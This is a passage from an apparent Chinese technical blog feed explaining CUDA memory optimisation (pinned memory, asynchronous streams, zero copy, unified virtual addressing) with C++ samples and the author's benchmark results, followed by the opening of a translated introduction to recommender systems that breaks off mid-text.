内存速度快，但不应被过度地使用，因为它减少了操作系统和其他程序可用的物理内存量，从而拖累系统的整体性能。因此 pinned 内存其实是个稀缺资源，但令人头疼的是到底多少合适是很难知晓的。此外，pinned 内存分配可能会失败，因此应该始终检查错误，譬如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">cudaError_t status = <span class="hljs-built_in">cudaMallocHost</span>((<span class="hljs-type">void</span>**)&amp;h_aPinned, bytes);<br><span class="hljs-keyword">if</span> (status != cudaSuccess)<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error allocating pinned host memory\n&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="示例">示例</h3><p>使用 pinned 内存传输数据时仍可使用 <code>cudaMemcpy()</code> 这类函数。下面我们做个实验来看看到底 pinned 内存比一般内存要快多少。</p><p>先是分配内存：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">float</span> *h_aPageable = (<span class="hljs-type">float</span>*)<span class="hljs-built_in">malloc</span>(bytes);                    <span class="hljs-comment">// host pageable</span><br><span class="hljs-type">float</span> *h_bPageable = (<span class="hljs-type">float</span>*)<span class="hljs-built_in">malloc</span>(bytes);                    <span class="hljs-comment">// host pageable</span><br><span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaMallocHost</span>((<span class="hljs-type">void</span>**)&amp;h_aPinned, bytes) );        <span class="hljs-comment">// host pinned</span><br><span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaMallocHost</span>((<span class="hljs-type">void</span>**)&amp;h_bPinned, bytes) );        <span class="hljs-comment">// host pinned</span><br><span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaMalloc</span>((<span class="hljs-type">void</span>**)&amp;d_a, bytes) );                  <span class="hljs-comment">// device</span><br></code></pre></td></tr></table></figure><p>然后我们需要定义一个拷贝函数，让不同的内存页来分别执行：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">profileCopies</span><span class="hljs-params">(<span class="hljs-type">float</span> *h_a, <span class="hljs-type">float</span> *h_b, <span class="hljs-type">float</span> *d, </span></span><br><span class="hljs-params"><span class="hljs-function">                   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> n, <span class="hljs-type">char</span> *desc)</span> </span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s transfers\n&quot;</span>, desc);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bytes = n * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>);<br><br>  <span class="hljs-comment">// events for timing</span><br>  cudaEvent_t startEvent, stopEvent; <br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventCreate</span>(&amp;startEvent) );<br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventCreate</span>(&amp;stopEvent) );<br><br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventRecord</span>(startEvent, <span class="hljs-number">0</span>) );<br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaMemcpy</span>(d, h_a, bytes, cudaMemcpyHostToDevice) );<br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventRecord</span>(stopEvent, <span class="hljs-number">0</span>) );<br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventSynchronize</span>(stopEvent) );<br><br>  <span class="hljs-type">float</span> time;<br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventElapsedTime</span>(&amp;time, startEvent, stopEvent) );<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  Host to Device bandwidth (GB/s): %f\n&quot;</span>, bytes * <span class="hljs-number">1e-6</span> / time);<br><br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventRecord</span>(startEvent, <span class="hljs-number">0</span>) );<br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaMemcpy</span>(h_b, d, bytes, cudaMemcpyDeviceToHost) );<br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventRecord</span>(stopEvent, <span class="hljs-number">0</span>) );<br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventSynchronize</span>(stopEvent) );<br><br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventElapsedTime</span>(&amp;time, startEvent, stopEvent) );<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  Device to Host bandwidth (GB/s): %f\n&quot;</span>, bytes * <span class="hljs-number">1e-6</span> / time);<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>    <span class="hljs-keyword">if</span> (h_a[i] != h_b[i]) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*** %s transfers failed ***\n&quot;</span>, desc);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// clean up events</span><br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventDestroy</span>(startEvent) );<br>  <span class="hljs-built_in">checkCuda</span>( <span class="hljs-built_in">cudaEventDestroy</span>(stopEvent) );<br>&#125;<br></code></pre></td></tr></table></figure><p>最后让他们分别执行：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// perform copies and report bandwidth</span><br><span class="hljs-built_in">profileCopies</span>(h_aPageable, h_bPageable, d_a, nElements, <span class="hljs-string">&quot;Pageable&quot;</span>);<br><span class="hljs-built_in">profileCopies</span>(h_aPinned, h_bPinned, d_a, nElements, <span class="hljs-string">&quot;Pinned&quot;</span>);<br></code></pre></td></tr></table></figure><p>首先说明一下本人机器型号及规格：</p><ul><li>NVIDIA GeForce RTX 3060 Ti，Compute capability: 8.6</li><li>AMD Ryzen 5 5600X 6-Core Processor 3.70 GHz</li></ul><p>然后咱们来看看性能差距究竟如何：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Device</span>: NVIDIA GeForce RTX <span class="hljs-number">3060</span> Ti<br><span class="hljs-attribute">Transfer</span> size (MB): <span class="hljs-number">16</span><br><br><span class="hljs-attribute">Pageable</span> transfers<br>  <span class="hljs-attribute">Host</span> to Device bandwidth (GB/s): <span class="hljs-number">10</span>.<span class="hljs-number">284997</span><br>  <span class="hljs-attribute">Device</span> to Host bandwidth (GB/s): <span class="hljs-number">8</span>.<span class="hljs-number">528336</span><br><br><span class="hljs-attribute">Pinned</span> transfers<br>  <span class="hljs-attribute">Host</span> to Device bandwidth (GB/s): <span class="hljs-number">24</span>.<span class="hljs-number">013557</span><br>  <span class="hljs-attribute">Device</span> to Host bandwidth (GB/s): <span class="hljs-number">24</span>.<span class="hljs-number">253503</span><br></code></pre></td></tr></table></figure><p>可以看到，使用 pinned 内存可以让带宽提升2-3倍，这对于内存受限的应用而言是一个巨大的福音。pinned 内存对于 CUDA 程序的内存优化有非常重要的意义，之后本文介绍的优化技术都与它相关。</p><h2 id="异步传输">异步传输</h2><h3 id="原理-2">原理</h3><p>常用的 <code>cudaMemcpy()</code> 函数实际上是一个阻塞函数，即主线程必须等待数据拷贝完毕后才会将控制返回。而使用 <code>cudaMemcpyAsync()</code> 这种非阻塞的异步函数，主线程会在数据传输启动后就返回，并继续执行。异步传输<strong>需要 pinned 内存</strong>（参见上节），且它需要一个额外的参数，stream ID。这个 stream ID 可以理解为 GPU 设备上按顺序执行的一系列操作（指令），设计人员很形象地将其比喻为流水，由一系列指令构成的运行流。不同流中的操作可以交错执行，在某些情况下可以重叠。所谓的重叠是指 GPU 在同一时间段内完成数据传输和计算任务，于是数据传输所花的时间被计算时间“重叠”了，花费的总时间也就少了。</p><h3 id="使用-2">使用</h3><p>下例子展示了主机计算与数据的重叠：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">cudaMemcpyAsync</span>(a_d, a_h, size, cudaMemcpyHostToDevice, <span class="hljs-number">0</span>);<br>kernel&lt;&lt;&lt;grid, block&gt;&gt;&gt;(a_d);<br><span class="hljs-built_in">cpuFunction</span>();<br></code></pre></td></tr></table></figure><p><code>cudaMempyAsync()</code> 函数的最后一个参数是 stream ID，这是相比 <code>cudaMemcpy()</code> 额外多出来的参数。在本例中使用默认流，流0。内核也使用默认流，它不会开始执行，直到内存复制完成。因此，不需要显式同步。因为内存拷贝和内核都立即将控制权返回给主机，所以主机函数 <code>cpuFunction()</code> 的执行会与数据传输重叠。</p><p>当然，对于异步传输，我们显然更希望将 GPU 的计算时间与数据传输时间重叠，这样这项技术才有真正的用武之地。在刚刚的例子中，数据复制和内核执行仍然是顺序发生的（先执行 MemcpyAsync 在执行 kernel 函数，而主机端的 <code>cpuFunction()</code> 可以先执行）。在<em>能够并发复制和计算</em>的设备上，可以将设备上的内核执行与主机和设备之间的数据传输重叠。设备是否具有此功能，可以通过 <code>cudaDeviceProp()</code> 返回的 <code>asyncEngineCount</code> 字段指示。在具有此功能的设备上，重叠再次需要固定的主机内存，此外，数据传输和执行计算的内核必须使用不同的非默认流（strem id非零的流）。这种重叠必须使用非默认流，因为默认流上的操作（包括内存复制、内核调用等等），只有在设备的其他所有流都“没事做”时才开始，根本无法重叠。下一个例子展示了两个流之间的重叠：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">cudaStreamCreate</span>(&amp;stream1);<br><span class="hljs-built_in">cudaStreamCreate</span>(&amp;stream2);<br><span class="hljs-built_in">cudaMemcpyAsync</span>(a_d, a_h, size, cudaMemcpyHostToDevice, stream1);<br>kernel&lt;&lt;&lt;grid, block, <span class="hljs-number">0</span>, stream2&gt;&gt;&gt;(otherData_d);<br></code></pre></td></tr></table></figure><p>在上面的示例中，创建了两个流，分别在数据传输和内核执行中使用，<code>cudaMemcpyAsync</code> 调用的最后一个参数指明使用了流1，而内核执行配置指明使用流2。此时这两个流可以并发执行，一个拷贝数据一个计算（当然前提是他们不能相互依赖）。</p><p>并发传输和执行演示了如何使内核执行与异步数据传输重叠。当数据依赖关系可以将数据分解成块并分多个阶段传输时，可以使用此技术，并在数据到达时启动多个内核对每个块进行操作。下图不严谨地展示了这一技巧的优点。其中第一个柱状图表示将数据先全体搬运到设备内存，再执行运算所需要的时间（浅绿色表示数据传输时间，红色表示数据计算时间），第二个柱状图表示使用并发异步传输任务的完成情况，可以很明显地看到使用异步传输的总时间要短不少：</p><p><img src="https://docs.nvidia.com/cuda/archive/11.7.0/cuda-c-best-practices-guide/graphics/timeline-comparison-for-copy-and-kernel-execution.png" alt=""></p><p>但这里出现了个问题，前言中本文说到：</p><blockquote><p>由于每次传输都有相关的固定开销，因此将许多小数据包装成一个较大的数据包进行传输，会比多次传输小数据包要好得多</p></blockquote><p>而在这里，我们又说将数据分解成块并分多个阶段传输可以重叠传输时间，提升性能。那么这两种叙述是否存在冲突？如何更好地理解这两句看似矛盾的话？</p><h3 id="示例-2">示例</h3><p>为了证明其效率，也为了解答刚才提出的问题，我们比较下面两个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// sequential transfer and execute</span><br><span class="hljs-built_in">cudaMemcpy</span>(d_a, a, bytes, cudaMemcpyHostToDevice);<br>kernel&lt;&lt;&lt;n/blockSize, blockSize&gt;&gt;&gt;(d_a, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">cudaMemcpy</span>(a, d_a, bytes, cudaMemcpyDeviceToHost);<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Staged concurrent copy and execute</span><br>size = N*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>) / nStreams;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nStreams; i++) &#123;<br>    offset = i * N / nStreams;<br>    <span class="hljs-built_in">cudaMemcpyAsync</span>(a_d+offset, a_h+offset, size, dir, stream[i]);<br>    kernel&lt;&lt;&lt; N / (nThreads*nStreams), nThreads, <span class="hljs-number">0</span>,  <br>          stream[i] &gt;&gt;&gt; (a_d+offset);<br>&#125;<br></code></pre></td></tr></table></figure><p>顺序复制和执行以及阶段并发复制和执行证明了这一点。它们产生相同的结果。第一部分展示了引用顺序实现，它传输和操作一个包含N个浮点数的数组(其中N被假定可以被nThreads平均整除)。</p><p>仍然是在我的主机上做了实验，该实验中，<code>blocksize</code> 为 256 ，一共 4 个流，每个流处理 4KB 的数据（太小的数据结果不明显），因此总共需要处理 <code>4x1024x256x4</code> Bytes 的数据。为了同时测量计算的精确度，我让 GPU 计算一个相对有意义的核函数，随后计算该结果与正确值的差距，具体如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">kernel</span><span class="hljs-params">(<span class="hljs-type">float</span> *a, <span class="hljs-type">int</span> offset)</span> </span>&#123;<br>    <span class="hljs-type">int</span> i = offset + threadIdx.x + blockIdx.x * blockDim.x;<br>    <span class="hljs-type">float</span> x = (<span class="hljs-type">float</span>)i;<br>    <span class="hljs-type">float</span> s = <span class="hljs-built_in">sinf</span>(x);<br>    <span class="hljs-type">float</span> c = <span class="hljs-built_in">cosf</span>(x);<br>    a[i] = a[i] + <span class="hljs-built_in">sqrtf</span>(s * s + c * c);<br>&#125;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>      <span class="hljs-type">float</span> error = <span class="hljs-built_in">fabs</span>(a[i] - <span class="hljs-number">1.0f</span>);<br>      <span class="hljs-keyword">if</span> (error &gt; maxE)<br>          maxE = error;<br>  &#125;<br></code></pre></td></tr></table></figure><p>计算结果如下，精度上两者没有差别，但由于传输时间与计算时间相互重叠，异步方法的总时间更少。这一结果也证明了，一次性传大批量的数据并不能提升性能，相反可能浪费了可以利用的异步机会。但烦恼的是，到底多大的数据传输才是最佳的仍需要依靠程序员的经验决定。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Device</span> : NVIDIA GeForce RTX <span class="hljs-number">3060</span> Ti<br><span class="hljs-attribute">Time</span> for sequential transfer and execute (ms): <span class="hljs-number">1</span>.<span class="hljs-number">693760</span><br>  <span class="hljs-attribute">max</span> error: <span class="hljs-number">1</span>.<span class="hljs-number">192093</span>e-<span class="hljs-number">07</span><br><span class="hljs-attribute">Time</span> for asynchronous transfer and execute (ms): <span class="hljs-number">1</span>.<span class="hljs-number">320736</span><br>  <span class="hljs-attribute">max</span> error: <span class="hljs-number">1</span>.<span class="hljs-number">192093</span>e-<span class="hljs-number">07</span><br></code></pre></td></tr></table></figure><h2 id="零拷贝">零拷贝</h2><h3 id="原理-3">原理</h3><p>上面提出的优化方案仍需要将数据从主机传输到设备，有没有可能让显卡直接使用主机内的数据，无需传输呢？可以的，这就是零拷贝。</p><p>零拷贝能使 GPU 线程直接访问主机内存。而通常，操作系统会使用内存分页机制将内存搞得“乱七八糟”的，因此零拷贝仍然要求使用 pinned 内存，它可将内存页固定住，从而让 GPU 能通过指针映射的方式访问数据。在集显上，映射主机上的 pinned 内存是很简单的事，且总能获得性能增益，因为集显和主机内存在物理上是相同的。只需通过 <code>cudaHostGetDevicePointer()</code> 便可获得映射的指针。</p><p>而在独显上，映射 pinned 内存仅在某些情况下是有利的。当数据没有缓存在 GPU 上时，被映射的 pinned 内存只能读取或写入一次，并且读写内存的全局加载和存储应该合并。零拷贝可以用来代替流，因为 kernel-originated 数据传输会自动重叠内核计算，不需要程序员手动设置和确定流的数量。</p><p>下面的代码展示了如何使用零拷贝技术：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">float</span> *a_h, *a_map;<br>...<br><span class="hljs-built_in">cudaGetDeviceProperties</span>(&amp;prop, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!prop.canMapHostMemory)<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">cudaSetDeviceFlags</span>(cudaDeviceMapHost);<br><span class="hljs-built_in">cudaHostAlloc</span>(&amp;a_h, nBytes, cudaHostAllocMapped);<br><span class="hljs-built_in">cudaHostGetDevicePointer</span>(&amp;a_map, a_h, <span class="hljs-number">0</span>);<br>kernel&lt;&lt;&lt;gridSize, blockSize&gt;&gt;&gt;(a_map);<br></code></pre></td></tr></table></figure><p>在这段代码中，<code>cudaGetDeviceProperties()</code> 返回结构体中的 <code>canMapHostMemory</code> 字段用于检查设备是否支持将主机内存映射到设备的地址空间。如果可以的话，程序通过调用 <code>cudaSetDeviceFlags(cudaDeviceMapHost)</code> 来启用页锁定内存映射。注意，该函数必须在设置设备或进行 CUDA 调用之前使用（即在创建上下文之前，在本例中，必须在分配内存执行核函数之前）。启用页锁定内存后，系统就知晓设备需要使用主机的内存。此时使用 <code>cudaHostAlloc()</code> 分配主机 pinned 内存，再通过 <code>cudaHostGetDevicePointer()</code> 函数，GPU 就可获得指向主机内存的指针。于是，在上面的代码中，<code>kernel()</code> 可以直接使用指针 <code>a_map</code> 使用主机内存上的数据。</p><h3 id="示例-3">示例</h3><p>本人使用的显卡是独显，我想试试在这种情况下使用零拷贝会发生什么，核心代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// decide if can use zero copy and set it</span><br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaGetDeviceProperties</span>(&amp;prop, <span class="hljs-number">0</span>));<br><span class="hljs-keyword">if</span> (!prop.canMapHostMemory) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sorry, but your device is not able to use zero copy.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaSetDeviceFlags</span>(cudaDeviceMapHost));<br><span class="hljs-comment">// malloc the pinned mem pointed by `a_h`</span><br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaHostAlloc</span>(&amp;a_h, nBytes, cudaHostAllocMapped));<br><br><span class="hljs-comment">// zero copy</span><br><span class="hljs-comment">// get Device mem pointer `a_map` from `a_h`</span><br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaHostGetDevicePointer</span>(&amp;a_map, a_h, <span class="hljs-number">0</span>));<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventRecord</span>(startEvent, <span class="hljs-number">0</span>));<br>kernel&lt;&lt;&lt;gridSize, blockSize&gt;&gt;&gt;(a_map, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventRecord</span>(stopEvent, <span class="hljs-number">0</span>));<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventSynchronize</span>(stopEvent));<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventElapsedTime</span>(&amp;ms, startEvent, stopEvent));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Time for zero copy execute (ms): %f\n&quot;</span>, ms);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  max error: %e\n&quot;</span>, <span class="hljs-built_in">maxError</span>(a_h, gridSize * blockSize));<br></code></pre></td></tr></table></figure><p>我们仍在之前的平台上运行示例程序，获得的结果如下。可以看出，使用零拷贝技术所需的时间大大减少，尤其是后续的运行，由于数据已存在于 GPU 缓存中，拷贝执行时间会变得非常少！也就是说，只要主机内存只会被写入一次（不被频繁地更新），那么 pinned 内存页上的数据会被放入缓存中，且不会失效。即使使用独显（显存和主机内存不同），系统也会先将数据放入 GPU 缓存中，只要不在程序运行时被主机频繁更改，那么零拷贝方案也是可行的。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment"># first execute</span><br>Time for MemCpy<span class="hljs-built_in"> execute </span>(ms): 1.400864<br>Time for asynchronous transfer<span class="hljs-built_in"> and </span>execute (ms): 1.291712<br>Time for zero copy<span class="hljs-built_in"> execute </span>(ms): 0.229344<br><span class="hljs-comment"># execute again</span><br>Time for MemCpy<span class="hljs-built_in"> execute </span>(ms): 1.433408<br>Time for asynchronous transfer<span class="hljs-built_in"> and </span>execute (ms): 1.291616<br>Time for zero copy<span class="hljs-built_in"> execute </span>(ms): 0.039264<br></code></pre></td></tr></table></figure><h2 id="统一虚拟地址空间">统一虚拟地址空间</h2><p>统一虚拟地址空间(Unified Virtual Address, UVA)将主机物理内存和设备物理内存统一在同一个虚拟地址空间下。因此，无论pinned 内存实际驻留在系统中的何处，所有设备和主机看到的指针值都是一样的。</p><p>于是，GPU 内运行的指针可以访问非设备内存空间上的数据，可以认为，在运行时指针对数据在哪个物理内存是无感知的。当然，程序员也可以通过 <code>cudaPointerGetAttributes()</code> 函数来知晓指针指向的物理内存空间。</p><p>在 UVA 中，将数据从任何设备的内存空间移出或者移入时，<code>cudaMemcpyKind</code> 参数可以设置为 <code>cudaMemcpyDefault</code>，以让 CUDA 自己根据指针确定数据拷贝方向。这也适用于没有通过 CUDA 分配的主机指针，只要当前设备使用了 UVA 技术。</p><p>在 UVA 中，使用 <code>cudaHostAlloc()</code> 分配的 pinned 内存获得的指针在主机和设备上都是一致的且有效的，此时指针可以直接在 CUDA 内核函数使用。然而，通过 <code>cudaHostRegister()</code> 在事后固定的主机内存，就不会有与主机指针相同的设备指针，因此在这种情况下使用 <code>cudaHostGetDevicePointer()</code> 仍然是必要的。</p><p>其实，无论是所谓的 pinned 内存还是零拷贝技术，可以说都是通过 UVA 机制实现的。因为 UVA 很强大，只要 pinned 内存按照上文介绍的方式分配，那么无论它们驻留在系统中的何处，所有设备和主机看到的指针值都是一样的。然而，虽然零拷贝技术允许设备代码直接访问主机内存，提供了统一内存的一些便利。但由于它实际上是通过PCIe传输数据的，因此PCIe的低带宽和高延迟拖累了它的性能。</p><p>正因为它使用 PCIe 传输数据，所以 UVA 机制也是实现多卡间点对点（P2P）数据传输的必要前提，GPUs 可绕过主机内存，通过 PCIe 总线或NVLink 传输数据。</p><p><strong>注意：</strong></p><p>UVA 是统一虚拟地址空间，不是 nvidia 在 CUDA 6 时加入的统一内存（UM）机制。统一内存可以在 CUDA runtime 将数据从一个物理位置迁移到另一个物理位置，对程序员透明。由于统一内存能够在主机和设备内存之间的单个页面级别自动迁移数据，因此这其实需要大量工程代码来实现。因为它需要在CUDA运行时，设备驱动程序甚至操作系统内核中提供新功能。</p><h2 id="总结">总结</h2><p>针对内存带宽的优化利用是高性能计算中永恒不变的主题。本博客主要罗列了几个CUDA中常用的针对内存优化的编程技术，主要包括了两方面：其一是使用固定内存来缩短设备获得数据的时间，这主要是通过优化内存地址转换实现的；其二是使用异步方法，这主要通过隐藏数据传输时间实现。当然，对于内存优化的方法不止一种，之后我会再更新其他的优化方法。</p>]]></content>
    
    
    <categories>
      
      <category>Parallel Computing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CUDA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>推荐系统简介</title>
    <link href="/2023/02/06/2023-2-6-recommender_systems/"/>
    <url>/2023/02/06/2023-2-6-recommender_systems/</url>
    
    <content type="html"><![CDATA[<h1>推荐系统简介——对主要推荐算法的概述</h1><p>本文翻译并整理自 Baptiste Rocca 的文章 <a href="https://towardsdatascience.com/introduction-to-recommender-systems-6c66cf15ada">Introduction to recommender systems</a>.</p><h2 id="引言">引言</h2><p>在过去的几十年里，随着 Youtube、亚马逊、Netflix 和许多其他此类网络服务的崛起，推荐系统在我们的生活中占据了越来越多的位置。从电子商务（向客户推荐他们感兴趣的文章）到在线广告（向用户推荐正确的内容，符合他们的喜好），推荐系统在我们的日常网络冲浪中已经不可避免。</p><p>用最通俗易懂的语言讲，推荐系统指的是旨在向用户推荐相关物品的算法（这物品可以是要看的电影，要阅读的文本，要购买的产品或其他取决于行业的东西）。</p><p>推荐系统在某些行业中非常重要，因为它们可以带来大量收入，或者令某项产品从竞争对手中脱颖而出。提一个可以证明推荐系统的重要性的例子，几年前，Netflix组织了一次挑战赛（“Netflix奖”），目标是参加者要制作一个比Netflix自己的算法表现更好的推荐系统，奖金为100万美元。</p><p>在本文中，我们将介绍不同的推荐系统范例。对于它们中的每一个，我们将介绍它们是如何工作的，描述它们的理论基础，并讨论它们的优缺点。</p><h3 id="大纲">大纲</h3><p>在第一节中，我们将概述两种主要的推荐系统范式：协同过滤（collaborative filtering）和基于内容的方法（content based methods）。接下来的两节将描述协同过滤的各种方法，例如用户——用户、物品——物品和矩阵分解。下面的部分将专门讨论基于内容的方法及其工作方式。最后，我们将讨论如何评估一个推荐系统。</p><hr><h2 id="协同过滤-VS-基于内容">协同过滤 VS 基于内容</h2><p>推荐系统的目的是向用户推荐相关的物品。为了实现这一任务，主要有两大类方法:协同过滤方法和基于内容的方法。在深入研究特定算法的细节之前，让我们简要讨论一下这两种主要的范式。</p><h3 id="协同过滤算法">协同过滤算法</h3><p>协同过滤方法凭借用户和物品之间的历史交互记录，从而产生新的推荐的方法。这些交互记录被存储在所谓的“用户-物品交互矩阵”（user-item interactions matrix）中。</p><p><img src="https://miro.medium.com/max/1400/1*m_Z6Da5FZ62KN2yH-x_GOQ@2x.webp" alt="Illustration of the user-item interactions matrix."></p><p>然后，协同过滤算法主要基于以下认识：<strong>过去的用户——物品交互记录足以检测出相似的用户和/或相似的物品，并可以基于这些估计的相似性做出准确的预测</strong>。</p><p>协同过滤算法分为两个子类别，通常称为基于内存的方法和基于模型的方法。基于内存的方法直接使用记录的交互值，若没有任何模型时，基本上使用最近邻居搜索（例如，从感兴趣的用户中找到最接近的用户，并将最受欢迎的物品推荐给该用户）。基于模型的方法假设了一个潜在的“生成”模型，该模型解释了用户与物品之间的交互关系，并试图以此做出新的预测。</p><p><img src="https://miro.medium.com/max/1400/1*yV3-_A1q37WheNJCvzutqg@2x.webp" alt="Overview of the collaborative 